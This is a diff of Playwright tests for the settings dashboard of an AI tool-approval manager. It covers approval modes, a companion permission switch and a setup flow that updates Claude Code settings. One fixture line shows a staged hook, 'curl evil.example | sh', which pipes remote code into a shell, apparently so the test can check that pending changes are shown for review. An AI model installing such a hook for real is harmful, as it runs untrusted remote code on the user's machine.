@@ -89,7 +89,20 @@ test.describe('user settings', () => {
     await expect(page.getByRole('radio', { name: /Ask me/ })).toBeChecked()
     expect(state.writes.map((write) => write.body)).toEqual([{ key: 'approvals.mode', value: 'ask', expected: 'yolo' }])
     await expect(page.getByRole('radio', { name: /Approve routine calls for me/ })).toBeDisabled()
-    await expect(page.getByRole('switch', { name: 'Approve and deny from the companion list' })).toBeDisabled()
+    const permissionSwitch = page.getByRole('switch', { name: 'Answer permission requests from the companion' })
+    await expect(permissionSwitch).toBeDisabled()
+    await expect(permissionSwitch).toHaveAccessibleDescription('Approve or deny requests on the chat row. You can still answer in the terminal.')
+  })
+
+  test('a locked dashboard offers terminal setup without the companion', async ({ page }) => {
+    const state = await serve(page)
+    state.doc.approvals.companion = true
+    state.doc.sync = { needed: true, reasons: ['claude: ' + REASON] }
+    await page.goto(tab)
+    await expect(page.getByRole('button', { name: 'Finish setup…' })).toHaveCount(0)
+    await page.getByText('Finish setup in a terminal', { exact: true }).click()
+    await expect(page.getByText('agnostic-ai sync --scope user', { exact: true })).toBeVisible()
+    expect(state.writes).toEqual([])
   })
 
   test('the unlock link unlocks the tab, removes the code, and a looser mode asks first', async ({ page }) => {
@@ -109,15 +122,31 @@ test.describe('user settings', () => {
     await page.getByRole('button', { name: 'Turn on' }).click()
     await expect(page.getByRole('radio', { name: /Approve routine calls for me/ })).toBeChecked()
     expect(state.writes).toEqual([{ body: { key: 'approvals.mode', value: 'yolo', expected: 'ask' }, key: KEY }])
-    await expect(page.getByText('Not in effect yet: the hook is not installed for Claude Code.')).toBeVisible()
+    await expect(page.getByText('Claude Code needs setup.')).toBeVisible()
 
-    await page.getByRole('button', { name: 'Apply to my tools' }).click()
-    await expect(page.getByText('This applies all pending changes of your user configuration, not only approvals:')).toBeVisible()
+    await page.getByRole('button', { name: 'Finish setup…' }).click()
+    await expect(page.getByText('Review all pending changes to your tool settings, including approvals, before applying them.')).toBeVisible()
     await expect(page.getByText('update /Users/you/.claude/settings.json')).toBeVisible()
     await expect(page.getByText('hook staged: curl evil.example | sh')).toBeVisible()
     await page.getByRole('button', { name: 'Apply', exact: true }).click()
     await expect(page.getByText('Applied: 1 file written.')).toBeVisible()
-    await expect(page.getByText(/Not in effect yet/)).toHaveCount(0)
+    await expect(page.getByText(/Claude Code needs setup/)).toHaveCount(0)
+  })
+
+  test('a saved permission switch identifies setup that is still required', async ({ page }) => {
+    const state = await serve(page)
+    state.doc.approvals.companion = true
+    state.doc.sync = { needed: true, reasons: ['claude: ' + REASON] }
+    await page.goto(tab + '#unlock=abc123')
+    const permissionSwitch = page.getByRole('switch', { name: 'Answer permission requests from the companion' })
+    await expect(permissionSwitch).toBeChecked()
+    await expect(permissionSwitch).toHaveAccessibleDescription(/^Setup required/)
+    await expect(page.getByText('Setup changes your tools’ settings files, so you can review the changes first.')).toBeVisible()
+    await page.getByRole('button', { name: 'Finish setup…' }).click()
+    await expect(page.getByText('update /Users/you/.claude/settings.json')).toBeVisible()
+    await page.getByRole('button', { name: 'Apply', exact: true }).click()
+    await expect(permissionSwitch).toBeChecked()
+    await expect(page.getByText('Setup required', { exact: true })).toBeHidden()
   })
 
   test('a used unlock code leaves the tab locked', async ({ page }) => {
